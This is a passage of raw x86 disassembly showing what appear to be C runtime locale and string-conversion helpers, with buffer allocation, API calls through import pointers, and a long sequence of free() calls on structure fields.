  407b0f:	39 5d 20             	cmp    %ebx,0x20(%ebp)
  407b12:	75 08                	jne    0x407b1c
  407b14:	8b 06                	mov    (%esi),%eax
  407b16:	8b 40 04             	mov    0x4(%eax),%eax
  407b19:	89 45 20             	mov    %eax,0x20(%ebp)
  407b1c:	8b 35 24 a1 40 00    	mov    0x40a124,%esi
  407b22:	33 c0                	xor    %eax,%eax
  407b24:	39 5d 24             	cmp    %ebx,0x24(%ebp)
  407b27:	53                   	push   %ebx
  407b28:	53                   	push   %ebx
  407b29:	ff 75 14             	push   0x14(%ebp)
  407b2c:	0f 95 c0             	setne  %al
  407b2f:	ff 75 10             	push   0x10(%ebp)
  407b32:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  407b39:	50                   	push   %eax
  407b3a:	ff 75 20             	push   0x20(%ebp)
  407b3d:	ff d6                	call   *%esi
  407b3f:	8b f8                	mov    %eax,%edi
  407b41:	3b fb                	cmp    %ebx,%edi
  407b43:	0f 84 8f 01 00 00    	je     0x407cd8
  407b49:	7e 43                	jle    0x407b8e
  407b4b:	6a e0                	push   $0xffffffe0
  407b4d:	33 d2                	xor    %edx,%edx
  407b4f:	58                   	pop    %eax
  407b50:	f7 f7                	div    %edi
  407b52:	83 f8 02             	cmp    $0x2,%eax
  407b55:	72 37                	jb     0x407b8e
  407b57:	8d 44 3f 08          	lea    0x8(%edi,%edi,1),%eax
  407b5b:	3d 00 04 00 00       	cmp    $0x400,%eax
  407b60:	77 13                	ja     0x407b75
  407b62:	e8 c9 1d 00 00       	call   0x409930
  407b67:	8b c4                	mov    %esp,%eax
  407b69:	3b c3                	cmp    %ebx,%eax
  407b6b:	74 1c                	je     0x407b89
  407b6d:	c7 00 cc cc 00 00    	movl   $0xcccc,(%eax)
  407b73:	eb 11                	jmp    0x407b86
  407b75:	50                   	push   %eax
  407b76:	e8 bd 08 00 00       	call   0x408438
  407b7b:	59                   	pop    %ecx
  407b7c:	3b c3                	cmp    %ebx,%eax
  407b7e:	74 09                	je     0x407b89
  407b80:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  407b86:	83 c0 08             	add    $0x8,%eax
  407b89:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407b8c:	eb 03                	jmp    0x407b91
  407b8e:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  407b91:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  407b94:	0f 84 3e 01 00 00    	je     0x407cd8
  407b9a:	57                   	push   %edi
  407b9b:	ff 75 f4             	push   -0xc(%ebp)
  407b9e:	ff 75 14             	push   0x14(%ebp)
  407ba1:	ff 75 10             	push   0x10(%ebp)
  407ba4:	6a 01                	push   $0x1
  407ba6:	ff 75 20             	push   0x20(%ebp)
  407ba9:	ff d6                	call   *%esi
  407bab:	85 c0                	test   %eax,%eax
  407bad:	0f 84 e3 00 00 00    	je     0x407c96
  407bb3:	8b 35 2c a1 40 00    	mov    0x40a12c,%esi
  407bb9:	53                   	push   %ebx
  407bba:	53                   	push   %ebx
  407bbb:	57                   	push   %edi
  407bbc:	ff 75 f4             	push   -0xc(%ebp)
  407bbf:	ff 75 0c             	push   0xc(%ebp)
  407bc2:	ff 75 08             	push   0x8(%ebp)
  407bc5:	ff d6                	call   *%esi
  407bc7:	8b c8                	mov    %eax,%ecx
  407bc9:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  407bcc:	3b cb                	cmp    %ebx,%ecx
  407bce:	0f 84 c2 00 00 00    	je     0x407c96
  407bd4:	f7 45 0c 00 04 00 00 	testl  $0x400,0xc(%ebp)
  407bdb:	74 29                	je     0x407c06
  407bdd:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  407be0:	0f 84 b0 00 00 00    	je     0x407c96
  407be6:	3b 4d 1c             	cmp    0x1c(%ebp),%ecx
  407be9:	0f 8f a7 00 00 00    	jg     0x407c96
  407bef:	ff 75 1c             	push   0x1c(%ebp)
  407bf2:	ff 75 18             	push   0x18(%ebp)
  407bf5:	57                   	push   %edi
  407bf6:	ff 75 f4             	push   -0xc(%ebp)
  407bf9:	ff 75 0c             	push   0xc(%ebp)
  407bfc:	ff 75 08             	push   0x8(%ebp)
  407bff:	ff d6                	call   *%esi
  407c01:	e9 90 00 00 00       	jmp    0x407c96
  407c06:	3b cb                	cmp    %ebx,%ecx
  407c08:	7e 45                	jle    0x407c4f
  407c0a:	6a e0                	push   $0xffffffe0
  407c0c:	33 d2                	xor    %edx,%edx
  407c0e:	58                   	pop    %eax
  407c0f:	f7 f1                	div    %ecx
  407c11:	83 f8 02             	cmp    $0x2,%eax
  407c14:	72 39                	jb     0x407c4f
  407c16:	8d 44 09 08          	lea    0x8(%ecx,%ecx,1),%eax
  407c1a:	3d 00 04 00 00       	cmp    $0x400,%eax
  407c1f:	77 16                	ja     0x407c37
  407c21:	e8 0a 1d 00 00       	call   0x409930
  407c26:	8b f4                	mov    %esp,%esi
  407c28:	3b f3                	cmp    %ebx,%esi
  407c2a:	74 6a                	je     0x407c96
  407c2c:	c7 06 cc cc 00 00    	movl   $0xcccc,(%esi)
  407c32:	83 c6 08             	add    $0x8,%esi
  407c35:	eb 1a                	jmp    0x407c51
  407c37:	50                   	push   %eax
  407c38:	e8 fb 07 00 00       	call   0x408438
  407c3d:	59                   	pop    %ecx
  407c3e:	3b c3                	cmp    %ebx,%eax
  407c40:	74 09                	je     0x407c4b
  407c42:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  407c48:	83 c0 08             	add    $0x8,%eax
  407c4b:	8b f0                	mov    %eax,%esi
  407c4d:	eb 02                	jmp    0x407c51
  407c4f:	33 f6                	xor    %esi,%esi
  407c51:	3b f3                	cmp    %ebx,%esi
  407c53:	74 41                	je     0x407c96
  407c55:	ff 75 f8             	push   -0x8(%ebp)
  407c58:	56                   	push   %esi
  407c59:	57                   	push   %edi
  407c5a:	ff 75 f4             	push   -0xc(%ebp)
  407c5d:	ff 75 0c             	push   0xc(%ebp)
  407c60:	ff 75 08             	push   0x8(%ebp)
  407c63:	ff 15 2c a1 40 00    	call   *0x40a12c
  407c69:	85 c0                	test   %eax,%eax
  407c6b:	74 22                	je     0x407c8f
  407c6d:	53                   	push   %ebx
  407c6e:	53                   	push   %ebx
  407c6f:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  407c72:	75 04                	jne    0x407c78
  407c74:	53                   	push   %ebx
  407c75:	53                   	push   %ebx
  407c76:	eb 06                	jmp    0x407c7e
  407c78:	ff 75 1c             	push   0x1c(%ebp)
  407c7b:	ff 75 18             	push   0x18(%ebp)
  407c7e:	ff 75 f8             	push   -0x8(%ebp)
  407c81:	56                   	push   %esi
  407c82:	53                   	push   %ebx
  407c83:	ff 75 20             	push   0x20(%ebp)
  407c86:	ff 15 88 a0 40 00    	call   *0x40a088
  407c8c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407c8f:	56                   	push   %esi
  407c90:	e8 b8 fd ff ff       	call   0x407a4d
  407c95:	59                   	pop    %ecx
  407c96:	ff 75 f4             	push   -0xc(%ebp)
  407c99:	e8 af fd ff ff       	call   0x407a4d
  407c9e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407ca1:	59                   	pop    %ecx
  407ca2:	e9 59 01 00 00       	jmp    0x407e00
  407ca7:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  407caa:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  407cad:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  407cb0:	75 08                	jne    0x407cba
  407cb2:	8b 06                	mov    (%esi),%eax
  407cb4:	8b 40 14             	mov    0x14(%eax),%eax
  407cb7:	89 45 08             	mov    %eax,0x8(%ebp)
  407cba:	39 5d 20             	cmp    %ebx,0x20(%ebp)
  407cbd:	75 08                	jne    0x407cc7
  407cbf:	8b 06                	mov    (%esi),%eax
  407cc1:	8b 40 04             	mov    0x4(%eax),%eax
  407cc4:	89 45 20             	mov    %eax,0x20(%ebp)
  407cc7:	ff 75 08             	push   0x8(%ebp)
  407cca:	e8 60 1a 00 00       	call   0x40972f
  407ccf:	59                   	pop    %ecx
  407cd0:	89 45 ec             	mov    %eax,-0x14(%ebp)
  407cd3:	83 f8 ff             	cmp    $0xffffffff,%eax
  407cd6:	75 07                	jne    0x407cdf
  407cd8:	33 c0                	xor    %eax,%eax
  407cda:	e9 21 01 00 00       	jmp    0x407e00
  407cdf:	3b 45 20             	cmp    0x20(%ebp),%eax
  407ce2:	0f 84 db 00 00 00    	je     0x407dc3
  407ce8:	53                   	push   %ebx
  407ce9:	53                   	push   %ebx
  407cea:	8d 4d 14             	lea    0x14(%ebp),%ecx
  407ced:	51                   	push   %ecx
  407cee:	ff 75 10             	push   0x10(%ebp)
  407cf1:	50                   	push   %eax
  407cf2:	ff 75 20             	push   0x20(%ebp)
  407cf5:	e8 7e 1a 00 00       	call   0x409778
  407cfa:	83 c4 18             	add    $0x18,%esp
  407cfd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407d00:	3b c3                	cmp    %ebx,%eax
  407d02:	74 d4                	je     0x407cd8
  407d04:	8b 35 28 a1 40 00    	mov    0x40a128,%esi
  407d0a:	53                   	push   %ebx
  407d0b:	53                   	push   %ebx
  407d0c:	ff 75 14             	push   0x14(%ebp)
  407d0f:	50                   	push   %eax
  407d10:	ff 75 0c             	push   0xc(%ebp)
  407d13:	ff 75 08             	push   0x8(%ebp)
  407d16:	ff d6                	call   *%esi
  407d18:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407d1b:	3b c3                	cmp    %ebx,%eax
  407d1d:	75 07                	jne    0x407d26
  407d1f:	33 f6                	xor    %esi,%esi
  407d21:	e9 b7 00 00 00       	jmp    0x407ddd
  407d26:	7e 3d                	jle    0x407d65
  407d28:	83 f8 e0             	cmp    $0xffffffe0,%eax
  407d2b:	77 38                	ja     0x407d65
  407d2d:	83 c0 08             	add    $0x8,%eax
  407d30:	3d 00 04 00 00       	cmp    $0x400,%eax
  407d35:	77 16                	ja     0x407d4d
  407d37:	e8 f4 1b 00 00       	call   0x409930
  407d3c:	8b fc                	mov    %esp,%edi
  407d3e:	3b fb                	cmp    %ebx,%edi
  407d40:	74 dd                	je     0x407d1f
  407d42:	c7 07 cc cc 00 00    	movl   $0xcccc,(%edi)
  407d48:	83 c7 08             	add    $0x8,%edi
  407d4b:	eb 1a                	jmp    0x407d67
  407d4d:	50                   	push   %eax
  407d4e:	e8 e5 06 00 00       	call   0x408438
  407d53:	59                   	pop    %ecx
  407d54:	3b c3                	cmp    %ebx,%eax
  407d56:	74 09                	je     0x407d61
  407d58:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  407d5e:	83 c0 08             	add    $0x8,%eax
  407d61:	8b f8                	mov    %eax,%edi
  407d63:	eb 02                	jmp    0x407d67
  407d65:	33 ff                	xor    %edi,%edi
  407d67:	3b fb                	cmp    %ebx,%edi
  407d69:	74 b4                	je     0x407d1f
  407d6b:	ff 75 f8             	push   -0x8(%ebp)
  407d6e:	53                   	push   %ebx
  407d6f:	57                   	push   %edi
  407d70:	e8 2b cf ff ff       	call   0x404ca0
  407d75:	83 c4 0c             	add    $0xc,%esp
  407d78:	ff 75 f8             	push   -0x8(%ebp)
  407d7b:	57                   	push   %edi
  407d7c:	ff 75 14             	push   0x14(%ebp)
  407d7f:	ff 75 f4             	push   -0xc(%ebp)
  407d82:	ff 75 0c             	push   0xc(%ebp)
  407d85:	ff 75 08             	push   0x8(%ebp)
  407d88:	ff d6                	call   *%esi
  407d8a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407d8d:	3b c3                	cmp    %ebx,%eax
  407d8f:	75 04                	jne    0x407d95
  407d91:	33 f6                	xor    %esi,%esi
  407d93:	eb 25                	jmp    0x407dba
  407d95:	ff 75 1c             	push   0x1c(%ebp)
  407d98:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407d9b:	ff 75 18             	push   0x18(%ebp)
  407d9e:	50                   	push   %eax
  407d9f:	57                   	push   %edi
  407da0:	ff 75 20             	push   0x20(%ebp)
  407da3:	ff 75 ec             	push   -0x14(%ebp)
  407da6:	e8 cd 19 00 00       	call   0x409778
  407dab:	8b f0                	mov    %eax,%esi
  407dad:	89 75 f0             	mov    %esi,-0x10(%ebp)
  407db0:	83 c4 18             	add    $0x18,%esp
  407db3:	f7 de                	neg    %esi
  407db5:	1b f6                	sbb    %esi,%esi
  407db7:	23 75 f8             	and    -0x8(%ebp),%esi
  407dba:	57                   	push   %edi
  407dbb:	e8 8d fc ff ff       	call   0x407a4d
  407dc0:	59                   	pop    %ecx
  407dc1:	eb 1a                	jmp    0x407ddd
  407dc3:	ff 75 1c             	push   0x1c(%ebp)
  407dc6:	ff 75 18             	push   0x18(%ebp)
  407dc9:	ff 75 14             	push   0x14(%ebp)
  407dcc:	ff 75 10             	push   0x10(%ebp)
  407dcf:	ff 75 0c             	push   0xc(%ebp)
  407dd2:	ff 75 08             	push   0x8(%ebp)
  407dd5:	ff 15 28 a1 40 00    	call   *0x40a128
  407ddb:	8b f0                	mov    %eax,%esi
  407ddd:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  407de0:	74 09                	je     0x407deb
  407de2:	ff 75 f4             	push   -0xc(%ebp)
  407de5:	e8 01 ca ff ff       	call   0x4047eb
  407dea:	59                   	pop    %ecx
  407deb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407dee:	3b c3                	cmp    %ebx,%eax
  407df0:	74 0c                	je     0x407dfe
  407df2:	39 45 18             	cmp    %eax,0x18(%ebp)
  407df5:	74 07                	je     0x407dfe
  407df7:	50                   	push   %eax
  407df8:	e8 ee c9 ff ff       	call   0x4047eb
  407dfd:	59                   	pop    %ecx
  407dfe:	8b c6                	mov    %esi,%eax
  407e00:	8d 65 e0             	lea    -0x20(%ebp),%esp
  407e03:	5f                   	pop    %edi
  407e04:	5e                   	pop    %esi
  407e05:	5b                   	pop    %ebx
  407e06:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407e09:	33 cd                	xor    %ebp,%ecx
  407e0b:	e8 df cd ff ff       	call   0x404bef
  407e10:	c9                   	leave
  407e11:	c3                   	ret
  407e12:	8b ff                	mov    %edi,%edi
  407e14:	55                   	push   %ebp
  407e15:	8b ec                	mov    %esp,%ebp
  407e17:	83 ec 10             	sub    $0x10,%esp
  407e1a:	ff 75 08             	push   0x8(%ebp)
  407e1d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407e20:	e8 34 99 ff ff       	call   0x401759
  407e25:	ff 75 28             	push   0x28(%ebp)
  407e28:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407e2b:	ff 75 24             	push   0x24(%ebp)
  407e2e:	ff 75 20             	push   0x20(%ebp)
  407e31:	ff 75 1c             	push   0x1c(%ebp)
  407e34:	ff 75 18             	push   0x18(%ebp)
  407e37:	ff 75 14             	push   0x14(%ebp)
  407e3a:	ff 75 10             	push   0x10(%ebp)
  407e3d:	ff 75 0c             	push   0xc(%ebp)
  407e40:	e8 28 fc ff ff       	call   0x407a6d
  407e45:	83 c4 20             	add    $0x20,%esp
  407e48:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  407e4c:	74 07                	je     0x407e55
  407e4e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407e51:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  407e55:	c9                   	leave
  407e56:	c3                   	ret
  407e57:	8b ff                	mov    %edi,%edi
  407e59:	55                   	push   %ebp
  407e5a:	8b ec                	mov    %esp,%ebp
  407e5c:	51                   	push   %ecx
  407e5d:	51                   	push   %ecx
  407e5e:	a1 60 db 40 00       	mov    0x40db60,%eax
  407e63:	33 c5                	xor    %ebp,%eax
  407e65:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407e68:	a1 68 e5 40 00       	mov    0x40e568,%eax
  407e6d:	53                   	push   %ebx
  407e6e:	56                   	push   %esi
  407e6f:	33 db                	xor    %ebx,%ebx
  407e71:	57                   	push   %edi
  407e72:	8b f9                	mov    %ecx,%edi
  407e74:	3b c3                	cmp    %ebx,%eax
  407e76:	75 3a                	jne    0x407eb2
  407e78:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407e7b:	50                   	push   %eax
  407e7c:	33 f6                	xor    %esi,%esi
  407e7e:	46                   	inc    %esi
  407e7f:	56                   	push   %esi
  407e80:	68 2c aa 40 00       	push   $0x40aa2c
  407e85:	56                   	push   %esi
  407e86:	ff 15 34 a1 40 00    	call   *0x40a134
  407e8c:	85 c0                	test   %eax,%eax
  407e8e:	74 08                	je     0x407e98
  407e90:	89 35 68 e5 40 00    	mov    %esi,0x40e568
  407e96:	eb 34                	jmp    0x407ecc
  407e98:	ff 15 8c a0 40 00    	call   *0x40a08c
  407e9e:	83 f8 78             	cmp    $0x78,%eax
  407ea1:	75 0a                	jne    0x407ead
  407ea3:	6a 02                	push   $0x2
  407ea5:	58                   	pop    %eax
  407ea6:	a3 68 e5 40 00       	mov    %eax,0x40e568
  407eab:	eb 05                	jmp    0x407eb2
  407ead:	a1 68 e5 40 00       	mov    0x40e568,%eax
  407eb2:	83 f8 02             	cmp    $0x2,%eax
  407eb5:	0f 84 cf 00 00 00    	je     0x407f8a
  407ebb:	3b c3                	cmp    %ebx,%eax
  407ebd:	0f 84 c7 00 00 00    	je     0x407f8a
  407ec3:	83 f8 01             	cmp    $0x1,%eax
  407ec6:	0f 85 e8 00 00 00    	jne    0x407fb4
  407ecc:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  407ecf:	39 5d 18             	cmp    %ebx,0x18(%ebp)
  407ed2:	75 08                	jne    0x407edc
  407ed4:	8b 07                	mov    (%edi),%eax
  407ed6:	8b 40 04             	mov    0x4(%eax),%eax
  407ed9:	89 45 18             	mov    %eax,0x18(%ebp)
  407edc:	8b 35 24 a1 40 00    	mov    0x40a124,%esi
  407ee2:	33 c0                	xor    %eax,%eax
  407ee4:	39 5d 20             	cmp    %ebx,0x20(%ebp)
  407ee7:	53                   	push   %ebx
  407ee8:	53                   	push   %ebx
  407ee9:	ff 75 10             	push   0x10(%ebp)
  407eec:	0f 95 c0             	setne  %al
  407eef:	ff 75 0c             	push   0xc(%ebp)
  407ef2:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  407ef9:	50                   	push   %eax
  407efa:	ff 75 18             	push   0x18(%ebp)
  407efd:	ff d6                	call   *%esi
  407eff:	8b f8                	mov    %eax,%edi
  407f01:	3b fb                	cmp    %ebx,%edi
  407f03:	0f 84 ab 00 00 00    	je     0x407fb4
  407f09:	7e 3c                	jle    0x407f47
  407f0b:	81 ff f0 ff ff 7f    	cmp    $0x7ffffff0,%edi
  407f11:	77 34                	ja     0x407f47
  407f13:	8d 44 3f 08          	lea    0x8(%edi,%edi,1),%eax
  407f17:	3d 00 04 00 00       	cmp    $0x400,%eax
  407f1c:	77 13                	ja     0x407f31
  407f1e:	e8 0d 1a 00 00       	call   0x409930
  407f23:	8b c4                	mov    %esp,%eax
  407f25:	3b c3                	cmp    %ebx,%eax
  407f27:	74 1c                	je     0x407f45
  407f29:	c7 00 cc cc 00 00    	movl   $0xcccc,(%eax)
  407f2f:	eb 11                	jmp    0x407f42
  407f31:	50                   	push   %eax
  407f32:	e8 01 05 00 00       	call   0x408438
  407f37:	59                   	pop    %ecx
  407f38:	3b c3                	cmp    %ebx,%eax
  407f3a:	74 09                	je     0x407f45
  407f3c:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  407f42:	83 c0 08             	add    $0x8,%eax
  407f45:	8b d8                	mov    %eax,%ebx
  407f47:	85 db                	test   %ebx,%ebx
  407f49:	74 69                	je     0x407fb4
  407f4b:	8d 04 3f             	lea    (%edi,%edi,1),%eax
  407f4e:	50                   	push   %eax
  407f4f:	6a 00                	push   $0x0
  407f51:	53                   	push   %ebx
  407f52:	e8 49 cd ff ff       	call   0x404ca0
  407f57:	83 c4 0c             	add    $0xc,%esp
  407f5a:	57                   	push   %edi
  407f5b:	53                   	push   %ebx
  407f5c:	ff 75 10             	push   0x10(%ebp)
  407f5f:	ff 75 0c             	push   0xc(%ebp)
  407f62:	6a 01                	push   $0x1
  407f64:	ff 75 18             	push   0x18(%ebp)
  407f67:	ff d6                	call   *%esi
  407f69:	85 c0                	test   %eax,%eax
  407f6b:	74 11                	je     0x407f7e
  407f6d:	ff 75 14             	push   0x14(%ebp)
  407f70:	50                   	push   %eax
  407f71:	53                   	push   %ebx
  407f72:	ff 75 08             	push   0x8(%ebp)
  407f75:	ff 15 34 a1 40 00    	call   *0x40a134
  407f7b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407f7e:	53                   	push   %ebx
  407f7f:	e8 c9 fa ff ff       	call   0x407a4d
  407f84:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407f87:	59                   	pop    %ecx
  407f88:	eb 75                	jmp    0x407fff
  407f8a:	33 f6                	xor    %esi,%esi
  407f8c:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  407f8f:	75 08                	jne    0x407f99
  407f91:	8b 07                	mov    (%edi),%eax
  407f93:	8b 40 14             	mov    0x14(%eax),%eax
  407f96:	89 45 1c             	mov    %eax,0x1c(%ebp)
  407f99:	39 5d 18             	cmp    %ebx,0x18(%ebp)
  407f9c:	75 08                	jne    0x407fa6
  407f9e:	8b 07                	mov    (%edi),%eax
  407fa0:	8b 40 04             	mov    0x4(%eax),%eax
  407fa3:	89 45 18             	mov    %eax,0x18(%ebp)
  407fa6:	ff 75 1c             	push   0x1c(%ebp)
  407fa9:	e8 81 17 00 00       	call   0x40972f
  407fae:	59                   	pop    %ecx
  407faf:	83 f8 ff             	cmp    $0xffffffff,%eax
  407fb2:	75 04                	jne    0x407fb8
  407fb4:	33 c0                	xor    %eax,%eax
  407fb6:	eb 47                	jmp    0x407fff
  407fb8:	3b 45 18             	cmp    0x18(%ebp),%eax
  407fbb:	74 1e                	je     0x407fdb
  407fbd:	53                   	push   %ebx
  407fbe:	53                   	push   %ebx
  407fbf:	8d 4d 10             	lea    0x10(%ebp),%ecx
  407fc2:	51                   	push   %ecx
  407fc3:	ff 75 0c             	push   0xc(%ebp)
  407fc6:	50                   	push   %eax
  407fc7:	ff 75 18             	push   0x18(%ebp)
  407fca:	e8 a9 17 00 00       	call   0x409778
  407fcf:	8b f0                	mov    %eax,%esi
  407fd1:	83 c4 18             	add    $0x18,%esp
  407fd4:	3b f3                	cmp    %ebx,%esi
  407fd6:	74 dc                	je     0x407fb4
  407fd8:	89 75 0c             	mov    %esi,0xc(%ebp)
  407fdb:	ff 75 14             	push   0x14(%ebp)
  407fde:	ff 75 10             	push   0x10(%ebp)
  407fe1:	ff 75 0c             	push   0xc(%ebp)
  407fe4:	ff 75 08             	push   0x8(%ebp)
  407fe7:	ff 75 1c             	push   0x1c(%ebp)
  407fea:	ff 15 30 a1 40 00    	call   *0x40a130
  407ff0:	8b f8                	mov    %eax,%edi
  407ff2:	3b f3                	cmp    %ebx,%esi
  407ff4:	74 07                	je     0x407ffd
  407ff6:	56                   	push   %esi
  407ff7:	e8 ef c7 ff ff       	call   0x4047eb
  407ffc:	59                   	pop    %ecx
  407ffd:	8b c7                	mov    %edi,%eax
  407fff:	8d 65 ec             	lea    -0x14(%ebp),%esp
  408002:	5f                   	pop    %edi
  408003:	5e                   	pop    %esi
  408004:	5b                   	pop    %ebx
  408005:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408008:	33 cd                	xor    %ebp,%ecx
  40800a:	e8 e0 cb ff ff       	call   0x404bef
  40800f:	c9                   	leave
  408010:	c3                   	ret
  408011:	8b ff                	mov    %edi,%edi
  408013:	55                   	push   %ebp
  408014:	8b ec                	mov    %esp,%ebp
  408016:	83 ec 10             	sub    $0x10,%esp
  408019:	ff 75 08             	push   0x8(%ebp)
  40801c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40801f:	e8 35 97 ff ff       	call   0x401759
  408024:	ff 75 24             	push   0x24(%ebp)
  408027:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40802a:	ff 75 20             	push   0x20(%ebp)
  40802d:	ff 75 1c             	push   0x1c(%ebp)
  408030:	ff 75 18             	push   0x18(%ebp)
  408033:	ff 75 14             	push   0x14(%ebp)
  408036:	ff 75 10             	push   0x10(%ebp)
  408039:	ff 75 0c             	push   0xc(%ebp)
  40803c:	e8 16 fe ff ff       	call   0x407e57
  408041:	83 c4 1c             	add    $0x1c,%esp
  408044:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  408048:	74 07                	je     0x408051
  40804a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40804d:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  408051:	c9                   	leave
  408052:	c3                   	ret
  408053:	8b ff                	mov    %edi,%edi
  408055:	55                   	push   %ebp
  408056:	8b ec                	mov    %esp,%ebp
  408058:	56                   	push   %esi
  408059:	8b 75 08             	mov    0x8(%ebp),%esi
  40805c:	85 f6                	test   %esi,%esi
  40805e:	0f 84 81 01 00 00    	je     0x4081e5
  408064:	ff 76 04             	push   0x4(%esi)
  408067:	e8 7f c7 ff ff       	call   0x4047eb
  40806c:	ff 76 08             	push   0x8(%esi)
  40806f:	e8 77 c7 ff ff       	call   0x4047eb
  408074:	ff 76 0c             	push   0xc(%esi)
  408077:	e8 6f c7 ff ff       	call   0x4047eb
  40807c:	ff 76 10             	push   0x10(%esi)
  40807f:	e8 67 c7 ff ff       	call   0x4047eb
  408084:	ff 76 14             	push   0x14(%esi)
  408087:	e8 5f c7 ff ff       	call   0x4047eb
  40808c:	ff 76 18             	push   0x18(%esi)
  40808f:	e8 57 c7 ff ff       	call   0x4047eb
  408094:	ff 36                	push   (%esi)
  408096:	e8 50 c7 ff ff       	call   0x4047eb
  40809b:	ff 76 20             	push   0x20(%esi)
  40809e:	e8 48 c7 ff ff       	call   0x4047eb
  4080a3:	ff 76 24             	push   0x24(%esi)
  4080a6:	e8 40 c7 ff ff       	call   0x4047eb
  4080ab:	ff 76 28             	push   0x28(%esi)
  4080ae:	e8 38 c7 ff ff       	call   0x4047eb
  4080b3:	ff 76 2c             	push   0x2c(%esi)
  4080b6:	e8 30 c7 ff ff       	call   0x4047eb
  4080bb:	ff 76 30             	push   0x30(%esi)
  4080be:	e8 28 c7 ff ff       	call   0x4047eb
  4080c3:	ff 76 34             	push   0x34(%esi)
  4080c6:	e8 20 c7 ff ff       	call   0x4047eb
  4080cb:	ff 76 1c             	push   0x1c(%esi)
  4080ce:	e8 18 c7 ff ff       	call   0x4047eb
  4080d3:	ff 76 38             	push   0x38(%esi)
  4080d6:	e8 10 c7 ff ff       	call   0x4047eb
  4080db:	ff 76 3c             	push   0x3c(%esi)
  4080de:	e8 08 c7 ff ff       	call   0x4047eb
  4080e3:	83 c4 40             	add    $0x40,%esp
  4080e6:	ff 76 40             	push   0x40(%esi)
  4080e9:	e8 fd c6 ff ff       	call   0x4047eb
  4080ee:	ff 76 44             	push   0x44(%esi)
  4080f1:	e8 f5 c6 ff ff       	call   0x4047eb
  4080f6:	ff 76 48             	push   0x48(%esi)
  4080f9:	e8 ed c6 ff ff       	call   0x4047eb
  4080fe:	ff 76 4c             	push   0x4c(%esi)
  408101:	e8 e5 c6 ff ff       	call   0x4047eb
  408106:	ff 76 50             	push   0x50(%esi)
  408109:	e8 dd c6 ff ff       	call   0x4047eb
  40810e:	ff 76 54             	push   0x54(%esi)
  408111:	e8 d5 c6 ff ff       	call   0x4047eb
  408116:	ff 76 58             	push   0x58(%esi)
  408119:	e8 cd c6 ff ff       	call   0x4047eb
  40811e:	ff 76 5c             	push   0x5c(%esi)
  408121:	e8 c5 c6 ff ff       	call   0x4047eb
  408126:	ff 76 60             	push   0x60(%esi)
  408129:	e8 bd c6 ff ff       	call   0x4047eb
  40812e:	ff 76 64             	push   0x64(%esi)
  408131:	e8 b5 c6 ff ff       	call   0x4047eb
  408136:	ff 76 68             	push   0x68(%esi)
  408139:	e8 ad c6 ff ff       	call   0x4047eb
  40813e:	ff 76 6c             	push   0x6c(%esi)
  408141:	e8 a5 c6 ff ff       	call   0x4047eb
  408146:	ff 76 70             	push   0x70(%esi)
  408149:	e8 9d c6 ff ff       	call   0x4047eb
  40814e:	ff 76 74             	push   0x74(%esi)
  408151:	e8 95 c6 ff ff       	call   0x4047eb
  408156:	ff 76 78             	push   0x78(%esi)
  408159:	e8 8d c6 ff ff       	call   0x4047eb
  40815e:	ff 76 7c             	push   0x7c(%esi)
  408161:	e8 85 c6 ff ff       	call   0x4047eb
  408166:	83 c4 40             	add    $0x40,%esp
  408169:	ff b6 80 00 00 00    	push   0x80(%esi)
  40816f:	e8 77 c6 ff ff       	call   0x4047eb
  408174:	ff b6 84 00 00 00    	push   0x84(%esi)
  40817a:	e8 6c c6 ff ff       	call   0x4047eb
  40817f:	ff b6 88 00 00 00    	push   0x88(%esi)
  408185:	e8 61 c6 ff ff       	call   0x4047eb
  40818a:	ff b6 8c 00 00 00    	push   0x8c(%esi)
  408190:	e8 56 c6 ff ff       	call   0x4047eb
  408195:	ff b6 90 00 00 00    	push   0x90(%esi)
  40819b:	e8 4b c6 ff ff       	call   0x4047eb
  4081a0:	ff b6 94 00 00 00    	push   0x94(%esi)
  4081a6:	e8 40 c6 ff ff       	call   0x4047eb
  4081ab:	ff b6 98 00 00 00    	push   0x98(%esi)
  4081b1:	e8 35 c6 ff ff       	call   0x4047eb
  4081b6:	ff b6 9c 00 00 00    	push   0x9c(%esi)
  4081bc:	e8 2a c6 ff ff       	call   0x4047eb
  4081c1:	ff b6 a0 00 00 00    	push   0xa0(%esi)
  4081c7:	e8 1f c6 ff ff       	call   0x4047eb
